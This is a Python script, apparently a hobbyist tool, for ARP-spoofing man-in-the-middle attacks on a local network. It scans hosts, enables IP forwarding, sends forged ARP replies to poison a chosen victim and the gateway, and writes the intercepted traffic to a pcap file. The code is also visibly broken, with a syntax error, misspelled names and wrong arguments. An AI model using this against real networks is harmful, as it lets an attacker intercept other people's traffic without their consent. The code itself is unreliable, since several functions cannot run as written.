import scapy.all as scapy
import subprocess
import sys
import time
import os
from ipaddress import IPv4Network
import threading

# working dir
cwd = os.getcwd()


def sudoCheck():
    if not "SUDO_UID" in os.environ.keys():
        print("Acces Denied, Are you root?")
        exit(1)


def arpScan(ipRange):
    arpResponses = list()
    answeredList = scapy.arping(ipRange, verbose=0)[0]
    for res in answeredList:
        arpResponses.append({"ip": res[1].prsc, "mac": res[1].hwsrc})
    return arpResponses


def isGateway(gatewayIp):
    result = subprocess.run(
        ["route", "-n"], captureOutput=True).stdout.decode().split("\n")
    for row in result:
        if gatewayIp in row:
            return True
    return False


def getInterfaceNames():
    os.chdir("/sys/class/net")
    interfaceNames = os.listdir()
    return interfaceNames


def matchInterfaceName(row):
    interfaceName = getInterfaceNames()
    for iface in interfaceName:
        if iface in row:
            return iface


def gatewayInfo(networkInfo):
    result = subprocess.run(
        ["route", "-n"], capture_output=True).stdout.decode().split("\n")
    gateways = []
    for iface in networkInfo:
        for row in result:
            if iface["ip"] in row
            ifaceName = matchInterfaceName(row)
            gateways.append(
                {"iface": ifaceName, "ip": iface["ip"], "mac": iface["mac"]})
    return gateways


def clients(arpRes, gatewayRes):
    clientList = []
    for gateway in gatewayRes:
        for item in arpRes:
            if gateway["ip"] != item["ip"]:
                clientList.append(item)
    return clientList

# ip forwading


def allowIpForwading():
    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"])
    subprocess.run(["sysctl", "-p", "/etc/sysctl.conf"])


def arpSpoofer(targetIp, targetMac, spoofIp):
    pkt = scapy.ARP(op=2, pdst=targetIp, hwdst=targetIp, psrc=spoofIp)
    scapy.send(pkt, verbose=False)


def sendSpoofPackets():
    while True:
        arpSpoofer(gatewayInfo["ip"], gatewayInfo["mac"], nodeToSpoof["ip"])
        arpSpoofer(nodeToSpoof["ip"], nodeToSpoof["mac"], gatewayInfo["ip"])
        time.sleep(3)


def packetSniffer(inteface):
    packets = scapy.sniff(iface=interface, store=False, prn=processSniffedPkt)


def processSniffedpkt(pkt):
    print("writing pcap file")
    scapy.wrpcap("requests.pcap", pkt, append=True)


def printArpRes(arpRes):
    print("To Whom Much is Given, Much is expected")
    for id, res in enumerate(arpRes):
        print("{}\t\t{}\t\t{}".format(id, res["ip"], res["mac"]))
        while True:
            try:
                choice = int(input("Select the ID ARP"))
                if arpRes[choice]:
                    return choice
            except:
                print("Invalid Choice")

def getCmdArgs():
    ipRange = None
    if len(sys.argv) - 1 > 0 and sys.argv[1] != "ipRange":
        print("-ipRange flag not specified")
        return ipRange
    elif len(sys.argv) -1 > 0 and sys.argv[1] == "-ipRange":
        try:
            print(f"{IPv4Network(sys.argv[2])}")
            ipRange = sys.argv[2]
            print("valid CLI ip detected")
        except:
            print("Invalid CLI Argument detected")
    return ipRange

sudoCheck()

